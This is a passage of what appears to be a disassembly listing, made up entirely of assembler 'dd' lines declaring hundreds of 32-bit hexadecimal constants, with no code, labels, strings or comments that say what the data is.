		dd 95890D5Dh, 0A16914A3h, 3C1F5070h, 33AA4094h,	30F5D1C4h
		dd 3AED721Fh, 3D9037ADh, 0C92F8996h, 0B9593E4Fh, 0F33A5A6Ch
		dd 0BD612119h, 0A6FF379Eh, 9F719DE9h, 79104244h, 0BC423854h
		dd 883E9489h, 895977C1h, 0A620B343h, 480DDB62h,	91677F55h
		dd 0E75D46C8h, 6664A794h, 4D1189D9h, 4502B6D4h,	236E3A1h
		dd 757604F9h, 0DDC63458h, 4F52D703h, 0E3408BC4h, 76B25DD6h
		dd 0E67886BFh, 0D3C1FC21h, 0F7385092h, 0BB2C998Ah, 0F3A56E5Fh
		dd 79AA2CCCh, 177FA3EBh, 0CB666818h, 0A838A83Dh, 0AE5B16FDh
		dd 13CEE152h, 0FC84E0B4h, 0D3719976h, 9670082h,	0BE21AAC8h
		dd 0C15BD7BFh, 98D0F9C0h, 90A3F2C8h, 0FD45CB11h, 8AD124ABh
		dd 26116BC0h, 0D40922Bh, 88BB66A2h, 9211D96Bh, 0AA35909Ah
		dd 0E214CA7Eh, 0B4C5EC6Ch, 0F45C6465h, 6D19843Dh, 7373E476h
		dd 94BAB009h, 16C4A23h,	0EDD780A4h, 0EB2BDCh, 0FC4C5F62h
		dd 5A464691h, 48322719h, 0DCA3E022h, 0DA2D6073h, 0BEC9D749h
		dd 370F24E7h, 1FBB7CE6h, 0C8C48CC9h, 0DBEFBE43h, 8D9EE23Bh
		dd 31789679h, 55D9517Bh, 0D52F28C8h, 22DFD82Eh,	0F243352Fh
		dd 25080D41h, 62E29CAEh, 7C13DBFBh, 6E4E14F3h, 0AAFC775Ch
		dd 0FF6BE9Fh, 9916CC39h, 4C41DBD2h, 777581CDh, 3D40BC90h
		dd 69900485h, 0B235769Bh, 0C90963CBh, 64A31B06h, 90C53BF8h
		dd 0F1BACBDDh, 881E9546h, 8588B69Eh, 1579B439h,	1111343Eh
		dd 0E3FEDDF7h, 0D7F8A928h, 57AD1D0Fh, 5A714840h, 0E5A2DF4Ah
		dd 0A5A7F91Ah, 5CE40A74h, 969513A2h, 603F6F42h,	9A7014A2h
		dd 24E8821Ch, 561847C4h, 4AC680F4h, 0D9BAE13Dh,	6D06AEE4h
		dd 0B7A79AFBh, 3629B74Ah, 0A18A633Ah, 0DAB7C520h, 6103EA0Eh
		dd 4A6BEF6h, 45830344h,	7B58E1B9h, 8D2A5AE8h, 0B9B5FF79h
		dd 1DDEEE72h, 4B417F3Dh, 0A1450313h, 608163Dh, 0A538E1Fh
		dd 3E93D083h, 0B12CA495h, 0FB45ABCh, 75EC8E75h,	52EF955Fh
		dd 0BB6A0E84h, 3A08913Fh, 8C823A26h, 1F5424E1h,	0BC79C511h
		dd 0D69B527h, 0B38FAD3Dh, 0E60D5648h, 5E55C735h, 0E47B0682h
		dd 27ECCE58h, 0A962A5D7h, 1F6D334Dh, 0C86A4714h, 390C1367h
		dd 591203EDh, 5DDC64CDh, 0ADFF1844h, 5BFC0E9Eh,	3FE58D93h
		dd 376B82CAh, 88C62951h, 2AA5EB78h, 0A0270126h,	0F280A1B8h
		dd 0DD79457Eh, 0ED214D7Ch, 0CAE9CA4h, 0EB023C0Ah, 0DB639BCCh
		dd 0CDDC90DBh, 83840FD0h, 499C08DDh, 9AEBC250h,	187F597Dh
		dd 8A4EABFBh, 0DAA05EFAh, 9FBC9430h, 99F2662Ah,	0A650943Fh
		dd 0F15E0EFCh, 69BF0314h, 4B367931h, 26FF4776h,	0EDE29530h
		dd 21072528h, 64D192Dh,	93DB59B7h, 6CFE22A1h, 72FC27FFh
		dd 3D53131Fh, 28F8148Ah, 75EC08DFh, 0DAE3AFE4h,	0F07B59F3h
		dd 6B1DD0A1h, 55FA7B5Ch, 6448701Fh, 0D7F73973h,	9D5A1593h
		dd 0D9DA0D21h, 0DEF37368h, 39AFEF45h, 80EB9D0Eh, 9776937Ch
		dd 9046772Bh, 6C8213B1h, 3EC316A2h, 0E12A41ABh,	0D21C3490h
		dd 0B628CBBh, 46EE8F41h, 9E6398C5h, 0DC6FC701h,	37CF8787h
		dd 3071C958h, 0F66FA548h, 4A24F54Ah, 0E7FEBC06h, 0EB761D11h
		dd 0C92ECA7Bh, 0CAF84CA6h, 2E5915DCh, 3D97DB71h, 0B17C21FCh
		dd 0AD56A8A1h, 6774B2ECh, 0C157ECD4h, 4E1D7483h, 3D48DB73h
		dd 0DDFDEBA7h, 0B615E717h, 0FF5AE011h, 0DD53E7F7h, 7C6B0B64h
		dd 11583E8Ch, 0B485AB1Ah, 0DB069956h, 0CB4366FCh, 0B8005794h
		dd 43D0BE2Ah, 24221F5Fh, 9D1D6A47h, 87B24AA5h, 0A14754C6h
		dd 0A5BD787Fh, 18564A87h, 693C9F83h, 7579BBB5h,	1F374BDBh
		dd 8CCE0C0Fh, 1C21E484h, 0BC2F50C6h, 748A7F93h,	0A74CA8C5h
		dd 8D9F750Dh, 0AF57DCF7h, 0C7A2DE3Ch, 0B29D03FDh, 0BB63C278h
		dd 6DA0B95Dh, 9FC5B1A5h, 9A939A1Ch, 6C57CA03h, 7E912B35h
		dd 0E445C4C5h, 5608E067h, 0D4523EFCh, 0CDBA9845h, 0EB54A615h
		dd 173277F6h, 0C9D67AA3h, 6AC5EDCBh, 175431FFh,	5C290C99h
		dd 2571C1A2h, 9C4E5DFEh, 0E3C7A5F7h, 0BE64886Ch, 5F5A8C7Eh
		dd 0BC6EC481h, 0ACDFCA85h, 0D4712CA9h, 8E769724h, 0E03F39B4h
		dd 9C4D2F77h, 0ADA0AC7Bh, 7F327DA4h, 8E8CA690h,	3AFE83E2h
		dd 0EE0C5DB2h, 0B48713Fh, 8D3D2B41h, 9AF6FE11h,	0A34C8CDh
		dd 3CE2DE02h, 9349262Fh, 0E5C59F4Ch, 939A07B8h,	0CD58BD4Bh
		dd 66E68F40h, 19BEE195h
		dd 0D6ABF8ADh, 8A2514B6h, 6E6BF263h, 1A83396Ch,	0D5FD3AA1h
		dd 13BED341h, 5F638C56h, 0D2297A01h, 0DC0F41FDh, 66E5458Bh
		dd 0FB39412Fh, 0F706CC9Bh, 86D5CDB9h, 0CA913601h, 61B7564Dh
		dd 7B8C32DDh, 76196FC3h, 0F0D429F0h, 0E3FC868Ch, 4F5F1967h
		dd 0E9823220h, 0C6CB7B3Dh, 7E9FD0DEh, 93E44453h, 0C4E8C533h
		dd 1371BB4Fh, 0E11F91A7h, 6886B131h, 7019E03Fh,	699C9EBEh
		dd 34193C3Eh, 3113CA95h, 0DC2F3328h, 411EA425h,	0A275F5E1h
		dd 9DF2D10Fh, 6AE3D45Eh, 520F2EA6h, 0CB3B92D1h,	22BB2FB9h
		dd 0D04544F6h, 1ACF1523h, 0B413F7Bh, 2FAB1F1Ch,	0D736B5C0h
		dd 853549A5h, 0D92C873Dh, 205ED30Fh, 52A555A2h,	70B822B6h
		dd 0C9C5C183h, 82741246h, 0C0153813h, 5CA67332h, 8BECE1F7h
		dd 0D85A1D29h, 0B2C55D0Ch, 0C34BB5D4h, 0D76F801Dh, 3CF9AF22h
		dd 2E32CB0Ch, 0E22751A0h, 0C39E59FDh, 0F06EAF73h, 8AE1FB7h
		dd 0E6966468h, 19E524DAh, 425CA752h, 2BFCFD43h,	5D813C1Ch
		dd 0F8365BA7h, 73341428h, 7989B178h, 1450D1EAh,	3D2F3A53h
		dd 7C233C3Ah, 5BBC84C0h, 0E0F996E0h, 5B9CABAEh,	244F36F5h
		dd 16CD780Ah, 0FD8ABC68h, 7F2AB7E2h, 0DE2C8986h, 0BBBEEC0Eh
		dd 69090C79h, 0C96C693Ch, 9F1045E8h, 0D9551832h, 59917EFEh
		dd 0D26943A9h, 0D26BDB98h, 92203E50h, 0AB1A7F14h, 3260F221h
		dd 6FB245h, 0E9F04B0Ah,	473FF31h, 2A0BC6B5h, 4B47BA6Eh
		dd 986A1D2Ah, 0C6433CACh, 0A1BE7841h, 3463C33Fh, 9F0EC687h
		dd 0F397A1ADh, 0C58143B5h, 7ED2DDD0h, 0D3E94A23h, 0C213B1F4h
		dd 805104B6h, 82826661h, 0A0EC6069h, 0D3E58BE5h, 301E0763h
		dd 0F7C7299Eh, 68A5B97Bh, 36281272h, 607A105Dh,	3C7A64D4h
		dd 3AF53CFBh, 0A785C2CFh, 0C0A2F281h, 5F3899C6h, 3156FC7Eh
		dd 38CA7F35h, 0EAA20DE3h, 0FF500F97h, 4BC008ABh, 0B1024BDCh
		dd 5DB38895h, 0A6D584C5h, 12E68EA8h, 9DF18546h,	0B3D9AE7Ah
		dd 1D388CDh, 0DAA6B437h, 6B76202Ch, 48157578h, 73D12484h
		dd 13D01771h, 0AFBA7F23h, 0DE6821E1h, 0CA6B3758h, 0E3FC840Fh
		dd 5B0DE0B8h, 3C35602Eh, 32CF8E64h, 0F2FFF279h,	0B0FA5CA9h
		dd 7A0BCE91h, 0AF8E9FAFh, 0DF5D3847h, 5F2ECBCAh, 940E6046h
		dd 4A07EBDAh, 0D2D094F6h, 8617843Dh, 0F01C0A6Fh, 0D9272DB9h
		dd 8B29B6EAh, 0A434BE6h, 0F4E34F62h, 65890C41h,	0DE8BBB11h
		dd 0DFC23F25h, 92657330h, 60126EEBh, 0E2BF8A26h, 1CD99D9Ah
		dd 538B08DEh, 0DE37B233h, 9E1C17Ch, 2D1D19B8h, 10FC520Ah
		dd 0D6EBCD4Dh, 39BA995h, 2BDFD15Eh, 0DDB3D1C3h,	0B9215D13h
		dd 0E5ACA61Eh, 5363D277h, 33D9DE2Ch, 301828AAh,	4934620h
		dd 0FFA8934Bh, 20A16CDBh, 8452308Ch, 77FEC258h,	8F55216Ah
		dd 28155973h, 0BD156831h, 0C25DBB83h, 0B548F381h, 0DB99A1AEh
		dd 10090539h, 2448692Dh, 4034CC15h, 0B71DA5F4h,	1B1DD745h
		dd 316AEB55h, 2D76EF89h, 0C3AC1BA3h, 9180D607h,	0C8191E88h
		dd 0E07BC041h, 45D995A6h, 0E9EAE1E0h, 3838E9C4h, 5BD390D2h
		dd 648F8439h, 86910889h, 7495ADFAh, 8A19260Ch, 0ECE6871Fh
		dd 48ED8624h, 0CA44CEB6h, 0C697C95Dh, 0AAD74AEEh, 875020E7h
		dd 60C303D3h, 0A7917AF9h, 838FCC21h, 15FCEC16h,	50ABE08Ah
		dd 89E75C54h, 0E31C2FAFh, 83605D80h, 0E2A71139h, 0FE0B8218h
		dd 37A4B711h, 6931A880h, 17438EDEh, 386EB896h, 0B95355ADh
		dd 0E407EC57h, 14D450F1h, 0A932424Dh, 0D2CF4BD1h, 7152CCEBh
		dd 5FEAD834h, 1272AA89h, 2128F43Bh, 0FDF67341h,	0D0BD81E4h
		dd 0E9CB8703h, 870233C4h, 407E6D30h, 0BA231C62h, 0B0323AE1h
		dd 1121ACFAh, 0FC53F975h, 0C8C9C6C0h, 0F6CABD94h, 65D931AEh
		dd 0B32888D9h, 0EF315D65h, 2C59A8A5h, 7349A2CBh, 6EBE78B2h
		dd 87A86A61h, 540FCF0Eh, 0E077724Dh, 0A11CCA75h, 2206DCEBh
		dd 38BD282Fh, 0EBBE073Ah, 0A516425Bh, 0EA668557h, 0DC016C4Dh
		dd 0C1662470h, 0F2519A10h, 59C2DCDAh, 33A2042Bh, 711AEF96h
		dd 0A30C707Ah, 0C3CFC822h, 3BF7F5Eh, 0A45CDA49h, 3359CC81h
		dd 9894DD92h, 0E1E94C0Fh, 859161E5h, 0EB27B802h, 7C14C8F5h
		dd 0AAAD9DD7h, 539C717Ch, 0CF832E57h, 0F6BFB32Eh, 131BDA2Fh
		dd 0A1819786h, 304E704Fh, 3BBBDABDh, 756AF625h,	405C12FBh
		dd 0B4AF1B48h, 15F54520h, 0E5F0AB98h, 0C19667Ch, 4C21016Bh
		dd 4BEA9E91h, 72CA8FD0h, 6B62B67h, 5AB3078Dh, 0B1544157h
		dd 0E4B408CFh, 814E9195h, 4AABBE65h, 6A3EAFC0h,	514836F5h
		dd 0EFA6F468h, 0B06C610Fh, 3D94784h, 255A99DAh,	0C5097504h
		dd 0BA50B023h, 0D5B0E3B1h, 0C18061D2h, 0D98B8759h, 0F3F3B43Fh
		dd 0AB8A2929h, 0D761DE2Bh, 2098C02h, 0D5481FA3h, 5ACF9F9Dh
		dd 42E60735h, 267CDE47h, 6A7C01C0h, 0A89D7D07h,	72ED592Ch
		dd 0B4921606h, 0A2D14BA6h, 0ACB6C575h, 0A5313D0Eh, 0ABE3BA9h
		dd 0E9B8705h, 334BB42Bh, 474E3000h, 153A5498h, 86EA1BE7h
		dd 0FBB02EA9h, 80DC4B33h, 545B3B99h, 0FA9B49EEh, 190F6B9Fh
		dd 85775788h, 4448F3E1h, 1E44FC6h, 0B36C6FC6h, 0B7A35028h
		dd 0C24E4C06h, 0EE817EC6h, 0D0719476h, 0F77B3C3Dh, 73D3F8h
		dd 0EF825FF3h, 0D4591EB5h, 93224558h, 29B4A17Ah, 4E4BFE72h
		dd 9268121Fh, 14B932B9h, 91582680h, 1368E151h, 65DB3809h
		dd 91D0D9E0h, 8299083Eh, 10062BC2h, 0CE85DC58h,	9F686B9Ch
		dd 0F9D624BBh, 0D6ADA8D2h, 10A376F1h, 2F514559h, 0FC56AC55h
		dd 4737E57Ah, 0DAB035D4h, 86E42C12h, 0E44A3201h, 4A49BEDh
		dd 0C2C0F42Ah, 92A2FE16h, 6822C9F5h, 7B893F89h,	9222CC77h
		dd 0A4D308D0h, 19F22BF0h, 0E3F094CBh, 3E8B8FDh,	281834A1h
		dd 0DE60D6FCh, 0ECA27246h, 479C61CBh, 89CD405Ah, 0B2E8639Ah
		dd 35CB1FA4h, 0B872EBAEh, 9D41142Eh, 566BF359h,	0F5F0D5C2h
		dd 362B520Bh, 5F8C433h,	2B2AAA7Bh, 6B97F17Fh, 894208D0h
		dd 0C4CEBFC0h, 0C6E262A2h, 9415BC6Fh, 8B9E8C6Ch, 0E3DB22C1h
		dd 79144580h, 0E611354Bh, 0A1BD96E0h, 1C810D39h, 0FCBAE9BAh
		dd 9C55C7C8h, 0C1EC3231h, 85B9DA1Ch, 1035BB1Bh,	0BF93272Bh
		dd 435AB090h, 0C51AE7FFh, 7F903B6Ah, 52871DB6h,	3E280EF9h
		dd 7E8F55D6h, 7CF2F844h, 0F5BFE760h, 894B92ABh,	81EE5D09h
		dd 0EFF69DC7h, 91921953h, 8DFAC79Ch, 1C0DCD52h,	43925850h
		dd 67611CC6h, 0F1206FFFh, 0B07B6BC8h, 0F9C4E070h, 16335679h
		dd 591B2DD5h, 8125870Eh, 0F78CE397h, 5C590593h,	18643D27h
		dd 40374DFEh, 43C42391h, 0C4DA0F09h, 0EC0F5BBCh, 815EC2C9h
		dd 63556188h, 0C417E1Fh, 0C8AE32D2h, 0FE06F842h, 0E4D5B433h
		dd 88C38E27h, 0E7FDD700h, 4F91BC48h, 0ECDED746h, 0FD1186A2h
		dd 79D294F1h, 95B96226h, 0BBFEB5FAh, 0A5723A2Dh, 2FCC4F04h
		dd 0D6EE5900h, 0DB1C2DDCh, 0E7A0616Eh, 0B4CBACD6h, 1541FA8Dh
		dd 9E171683h, 389716E0h, 39A97A1Dh, 6FDEA812h, 9ABE1D35h
		dd 49739737h, 0AE93E33Fh, 0E6578A1h, 8B792FD3h,	36A4FC96h
		dd 6E2EA57Fh, 1A8B0911h, 57457AADh, 0CE07B17Dh,	0FF2018F1h
		dd 96312B47h, 609FF558h, 0BF5ECDDCh, 52F16CB8h,	4D85C9A2h
		dd 0B5A8839Dh, 261E45B3h, 0BF4F5C5Ch, 5AB7699Dh, 35A9FF43h
		dd 73D55F8Eh, 4F197A5h,	82A196Dh, 3510B14Ch, 963F2584h
		dd 4066F125h, 92528AC0h, 0D55B3C49h, 8081EEAEh,	14676B40h
		dd 43CFC052h, 0F94EE1ABh, 0ECFA28BBh, 0D8344605h, 0CED06870h
		dd 0A4A514F1h, 0EC51E76Bh
		dd 0B5B856AAh, 0E555B56h, 62781D2h, 0D0638F9Bh,	0A084DF7Eh
		dd 0D9D0517Fh, 4A968AE0h, 58F52ED5h, 2628DCAEh,	1D955053h
		dd 0A13E9155h, 0ADBA1C81h, 0F6D50871h, 32580D7h, 0B3633AEBh
		dd 42D49467h, 80FF1CE6h, 5A677A4Bh, 973DC2F0h, 1D8A73B1h
		dd 0BA7681D1h, 0D5B78C2Fh, 0E4C8B0A1h, 1B6E84A2h, 0BA96CCE3h
		dd 0B0844D4Eh, 9994CC52h, 2C6F422Ch, 2C513EDEh,	9EC8A8C5h
		dd 0ED9920D4h, 2A1CB387h, 7D00D840h, 23930B9Ch,	0B3C1C5A6h
		dd 3F6137F4h, 0D38D6A7Fh, 60B080A0h, 0DB5C4B31h, 6B8DEF5Ch
		dd 0FB1CA11Eh, 0FEE4315Dh, 53183DE2h, 6928A57Bh, 0A5F13AB4h
		dd 2F0F4433h, 9ED26393h, 906B470Eh, 55E1254Bh, 30DD807Eh
		dd 7A08ACC9h, 6E7DF3D2h, 0DE23C6FDh, 93D9D69h, 714D04B7h
		dd 0E2AE5D69h, 50313D18h, 4E7BB362h, 4DB21D5Bh,	0C0B1F465h
		dd 39A1EC9h, 2D7B446h, 0B8567C37h, 5632E08Bh, 378E8F0Ch
		dd 1DC3457Ch, 34965FE6h, 4CF8D0C1h, 79033414h, 6F7D7BDBh
		dd 2FF89D18h, 0BE00F397h, 6399F0A4h, 0A27708A2h, 193439DCh
		dd 0EFBA73E5h, 57256024h, 0D18CAFC5h, 5F01A804h, 0FF8FAE75h
		dd 26E7584Bh, 4B421553h, 75D7BA84h, 6A527531h, 197B02A8h
		dd 5DA0DA4h, 0C37A7C0Ah, 0A17FB96Fh, 0A9DE358h,	6E3D93A4h
		dd 8164DAE5h, 92A7ED67h, 34E6CD07h, 0D0EA03A5h,	359FB6F2h
		dd 0D39AE784h, 0ADDC4CA6h, 533E3999h, 0B6D59659h, 542B0205h
		dd 4CA1DA15h, 7165B161h, 82C30671h, 5B69CE74h, 57BC9A11h
		dd 7205D2A1h, 0DE0F1086h, 0D4C7DAFh, 32B019B5h,	3F7D9A9Ah
		dd 0EA9EDFF6h, 0ACC985D0h, 0E87370Eh, 0F24620C5h, 56BECB97h
		dd 0D9033489h, 4A114CECh, 0C47A6F0Ah, 0F291DB89h, 0C12C13B5h
		dd 1813172Ah, 3622C6A1h, 0BF840456h, 255361FEh,	6A382E5Fh
		dd 7FF95B00h, 3C93339Dh, 0EB8F3681h, 0BECE4E7Fh, 0E4F66A8Fh
		dd 0F0445CB8h, 0FED2BA25h, 0DAB573ABh, 0E25936B8h, 1B7D65B6h
		dd 0C76FD258h, 486F27E9h, 2928EB6Bh, 418C134Fh,	3A692F07h
		dd 380C1115h, 44956518h, 64A74CDFh, 178406AFh, 45777866h
		dd 0E21B9556h, 0A224B58Bh, 93D5B568h, 1F40AC17h, 12FFCF04h
		dd 0E793EF12h, 68CC641Bh, 708B38EEh, 62F3507Fh,	0F94D96F7h
		dd 12460A34h, 0E562E0FDh, 518F8A1h, 0DF016632h,	66BFD26h
		dd 0FF0F3507h, 0A61A1DC5h, 22F6C359h, 21F39332h, 9AF7792Fh
		dd 9B007C8Ch, 0F07015B7h, 300355D2h, 2F2F9980h,	0CC99D4B4h
		dd 81B38730h, 5AC8B9FFh, 0E618F3DDh, 907C11F9h,	7C62D215h
		dd 0C284FD31h, 71B940E5h, 24B3A288h, 0DF2483C1h, 6A344A33h
		dd 0C3E7A19Bh, 0B36A1C82h, 84EC2BBEh, 5462C418h, 47E6F525h
		dd 29253C97h, 380D2A53h, 6337A659h, 97499657h, 8AACF535h
		dd 2EA47ABh, 280EECC7h,	5AFE50E2h, 0AA1AA482h, 0DF00AAECh
		dd 0CDCF4A00h, 7C46B971h, 65377B30h, 0DB196DA8h, 2F61DCABh
		dd 0CC7B7397h, 737CEFAAh, 532C7E67h, 0C184979Dh, 655A5EE8h
		dd 0B6FC938Dh, 60A9D98Ch, 63A0BFA3h, 70342BCDh,	0F59C07DEh
		dd 0F5B3BE72h, 0D8F4795Bh, 0DC8AED77h, 7444C2F1h, 0D5C62761h
		dd 0E3708936h, 0C2461F7Fh, 42D3BF72h, 5FFB6AA2h, 72B7B88Ah
		dd 54DFCCF5h, 0B1E6C532h, 9D4FAA11h, 0CF12EA6Ah, 54393E44h
		dd 0D8F14977h, 0E9A498FFh, 0C1091C4Ah, 5095BC7h, 0CFD1FC0Fh
		dd 96C6B7D9h, 0F9C8AAF2h, 0DB50178Dh, 0E9A4A874h, 0F3CE10F2h
		dd 0FEFF5812h, 761DCEE3h, 11AC2832h, 0F734F3ACh, 0D261FCD1h
		dd 216E36Ch, 0DB039EAEh, 0B714EC55h, 70E48877h,	0EC4836D4h
		dd 0D4AC55A4h, 96663EADh, 79CA982Fh, 0F5416C33h, 183F3B05h
		dd 5EDF9951h, 0F03FF3C7h, 0B75F7BC8h, 7663FC4Dh, 0BC6A03A6h
		dd 0D8DE6733h, 0B882944Fh, 880D330Ah, 0DEF7CF88h, 3C1AB7C3h
		dd 0CFC6BB6Fh, 3FA6CD50h, 0AF7AA4E0h, 0DFBF3CB6h, 0D34D1BE0h
		dd 5C51D72Fh, 0F842752Ah, 0F4A2143Ch, 21716977h, 0CA2C8546h
		dd 63DB8360h, 0DC03A2CFh, 0C39CE33Fh, 0E3D7EDE6h, 7D923D2Eh
		dd 9BDC5B18h, 7C065E76h, 4C0C295Ah, 81FA1C51h, 0E230984Fh
		dd 30002BF3h, 897C67E8h, 0DD96FD42h, 83DFC79Bh,	98394650h
		dd 73586F99h, 5A3BC23Bh, 7426841Bh, 0DC29ACDDh,	57631765h
		dd 0B8217D30h, 41250E9Bh, 82141C0Fh, 42B220Ch, 0D0121E1Bh
		dd 0A7F39225h, 0E4CECBD2h, 4F6AFA5Bh, 0B669EB67h, 43FA1571h
		dd 268F0111h, 98AD47C7h, 0A9730D8h, 0EB539DEh, 32DE2305h
		dd 5FB6535h, 0A9542F29h, 3A9C4497h, 0AC6315Bh, 0E9E73FC8h
		dd 4791224Bh, 65D19E54h, 3EBC1EF3h, 0AC403F3Dh,	1BE11A4h
		dd 0E1AC01BBh, 2E66D819h, 0E52BCA49h, 0AA313D41h, 447B2740h
		dd 184DB6FBh, 1240B5C0h, 105D3D69h, 350D7380h, 0BEF2AAA9h
		dd 39134959h, 8E750531h, 0D75112B1h, 9333A30Dh,	0DB9CD17h
		dd 9C6F9E36h, 0B6215149h, 0BF037E74h, 20B06896h, 0DB21E43Bh
		dd 0B0229D58h, 0E8F4761Ch, 65DA0D89h, 4C2125EDh, 759238EFh
		dd 0DC84C044h, 0E3318B16h, 0BB5EB075h, 180CE929h, 0B0DA2794h
		dd 3745EBBDh, 0E6DD34D7h, 8BC89EC0h, 4DC8A9EFh,	0D77B5C7h
		dd 0E910A83Bh, 0BC36B274h, 0F8DF5E01h, 0CBE16DDDh, 0E90105D5h
		dd 0E23B1E37h, 2D972C3Ch, 8A845225h, 0E8F81D3Dh, 5E27444h
		dd 99EF0594h, 4A0FF6E9h, 0F03CFEB7h, 139AA9A5h,	3D7963B8h
		dd 0C1611F13h, 0F0555FAh, 0B984B71Eh, 0DCD859E6h, 0C7605D54h
		dd 3671890Bh, 43DB8653h, 5104AA7Ch, 0CEFCF13Eh,	0E93A27B5h
		dd 41D4EB49h, 0A5469340h, 395BE137h, 18BE19FAh,	6D6866A5h
		dd 9394D8DEh, 5B921B16h, 692DCF78h, 0DBE3CB4Bh,	376B97D0h
		dd 85E117BAh, 8B68015h,	0B261E44Ah, 0BF1FBE0Eh,	0F75578B1h
		dd 3CD32E0Dh, 1D5B1BBAh, 0F661B263h, 4099F5B3h,	0E0177459h
		dd 0E809178Eh, 7309C397h, 0BE5073A2h, 0A774391Ah, 87263060h
		dd 94A1B325h, 6EC0D75Bh, 0F589FEFFh, 0A4A5C15Eh, 0F48F1BFFh
		dd 7578C407h, 0E1D4D714h, 18DF3970h, 361F3900h,	67AD6E13h
		dd 0F9FF2FDFh, 864B570Ah, 0D8C34447h, 5A812269h, 17C8DF43h
		dd 6D345F91h, 6BCB1D9Dh, 6E648F89h, 5413DD10h, 0F5C3255Eh
		dd 0ADF81DE3h, 73E21F45h, 873ECC92h, 0EF8D87DCh, 835D19A2h
		dd 0BE0D26CCh, 0E76392B4h, 6915CBD6h, 0A9A13EB2h, 7164AD5Ah
		dd 4B0099D8h, 0EE85C0AAh, 899CF65Ah, 1462C85Ch,	36B80E2Ah
		dd 0A1A9E6CDh, 80CC7115h, 99679875h, 3D2308D8h,	46CA80F8h
		dd 4A62BEAFh, 0D5190290h, 0CED5138Dh, 1467271Bh, 22E97572h
		dd 7B33502Bh, 0F35AA1A8h, 8760FE33h, 0C175BD2Ah, 21BE87B1h
		dd 48CACC44h, 8E76A859h, 7AB0CB9Fh, 0B316EA16h,	0DC2B0ABBh
		dd 0C71F7756h, 0DCE594BDh, 0FBBE8309h, 9F47FA64h, 0A7BB669Fh
		dd 0EBFFA9F3h, 0C305C6FAh, 0DE1F1E9Ah, 0F240315Bh, 0F8617980h
		dd 1CD2EBE5h, 49A6F312h, 0CF89550Ch, 67545ABCh,	5ADA6F61h
		dd 0AF82DCA9h, 0B54EEBh, 47D9EEC8h, 0CC15F7DFh,	0E51E1725h
		dd 0E1E20BEDh, 6FC0F883h, 1CDE6079h, 0ACA46F1h,	478E137Fh
		dd 0AAE82A9h, 0F7EFD2F1h, 0CA99959Dh, 0C1815321h, 8014A4D1h
		dd 0C3B1CB5Ch, 0EFCA9860h, 86808011h, 0C33FF053h, 0B97B1190h
		dd 0E14E633Eh, 1E2A27F6h, 658F841Ah, 0DF91974Ah, 38023A21h
		dd 1F88F8Dh, 8233FC5Eh,	0C525AD3Ch, 8619CCA4h, 0F8E2B96Eh
		dd 3B7B8533h, 7044C42Eh, 9554EEBEh, 0A26110C0h,	0F880A638h
		dd 467DA22Eh, 0D6E5A55h, 0E4AD043Dh, 5B32BD22h,	5CD928C7h
		dd 0F84DCB2Bh, 68164CC5h
		dd 317E9C2Ch, 0FADCDDD1h, 265D10EFh, 43120043h,	588A0FB1h
		dd 8579AF95h, 0E0CECF18h, 3AEFB6DFh, 0EBB164E6h, 0B7416916h
		dd 3A306C69h, 86E17846h, 694894D5h, 739E4514h, 9E7C559Bh
		dd 0E16FD672h, 8020435Ch, 0EEF477C6h, 8FBCFC5Fh, 6020B1F0h
		dd 8BFECECh, 98290B7Eh,	642FFDB2h, 0ABC3B38Eh, 1CFC2A1Ah
		dd 6AC444D4h, 0F39F5EFh, 76BFB270h, 0DF797427h,	0EB875235h
		dd 61A763EAh, 0F3E09Ch,	0C0B31A65h, 0A408F02Dh,	0B7D1B542h
		dd 17A37C01h, 6C7F9F5Bh, 0A0B7DC6Ch, 0C6877153h, 0C4377C66h
		dd 50D581A2h, 6E056ECBh, 7EFDC11Fh, 3FC951Bh, 6ED98809h
		dd 42CCC02Dh, 0E7CAFF65h, 0CCAF2B76h, 21BBBE65h, 6912E50h
		dd 3FC145B9h, 0F2BAE1C6h, 7650E65Ah, 0B96FD45Ch, 0D1F35CA6h
		dd 1F3B7005h, 9717D1F4h, 0B016452h, 0DDD281CAh,	9047F286h
		dd 8462E46Ch, 5945A799h, 0F577A2A4h, 0F3BBF4F3h, 0BEF21F07h
		dd 0BBBBD5A3h, 8BD65336h, 6B4261Bh, 0FDCD6319h,	0AB67306Ah
		dd 15CEB8DFh, 1EA420E5h, 7488A7Bh, 0EF279ABAh, 0BB3CB07Ah
		dd 0DBF0278h, 0C52144C4h, 0EDBC986Eh, 24B42454h, 0B7263E43h
		dd 0DD629263h, 0A3AB505Dh, 0DB279A4Ch, 0A2AF0197h, 0E4830B94h
		dd 0DC000B58h, 0DEF9E05Eh, 62B1EB9Eh, 0AEDFEFB4h, 95A78C60h
		dd 0CDE31F6Ah, 61777EC2h, 79CC2DA8h, 31C1F327h,	0FC73F94Fh
		dd 0DC4FD35h, 0E87E6695h, 0EB97142Bh, 9F2297CEh, 76BF2E90h
		dd 506374B8h, 53B3328h,	9ADD38D5h, 4D03505h, 0BD313482h
		dd 90C5CF94h, 5663C635h, 0EBD821BFh, 72FF56ACh,	0D835A6DCh
		dd 0B67CCF29h, 12CD769Dh, 129DC5ECh, 23F2FDBFh,	19FF42CBh
		dd 2D2F5BD9h, 0F64FD93Fh, 4EE00345h, 82501DFEh,	0B381ED87h
		dd 0A941EFD6h, 23FEE2A0h, 9C9E83FFh, 802E491Dh,	0B00D2EDEh
		dd 603868B1h, 0DCC25D47h, 0E2A8BB19h, 7886B3B5h, 4BFB40A8h
		dd 0CC64D14Eh, 0EEAFEC91h, 1BB72E65h, 3274A7DAh, 2C9A71EEh
		dd 0AB7726C7h, 66802EC7h, 0BD73B61Bh, 0B8A801A6h, 61698326h
		dd 62775AA5h, 1388E192h, 0AB598D47h, 4DF3C33Bh,	6A4AEF81h
		dd 0C08D47ACh, 61111076h, 92AFCAACh, 9A2245Ch, 0E8C6D577h
		dd 0E2A0C509h, 4322CA74h, 9DC5830Fh, 0F7B06F10h, 502C20AEh
		dd 0FE6FBEE6h, 82DAE2ADh, 0FDE1733Ch, 76CFE141h, 75110E80h
		dd 83281E56h, 0C9543BCDh, 0DF5ADB30h, 0B4CB5766h, 78DDCE95h
		dd 8F0307F0h, 64DF2D72h, 0B49D289Bh, 0A3702042h, 9CD8B3D3h
		dd 405E62F6h, 39F7D7C4h, 0F9E886D1h, 5DB3BD58h,	0B4F97061h
		dd 871B426Dh, 6B18EC48h, 50F1CBD7h, 0EBF684D3h,	0EEE70CADh
		dd 9E5B702h, 0CC8711E1h, 6C728B76h, 73EFF7B7h, 0B474442Dh
		dd 0DCC7597Dh, 0F0D903ECh, 72E3D997h, 7BFCDD4Ch, 10C15021h
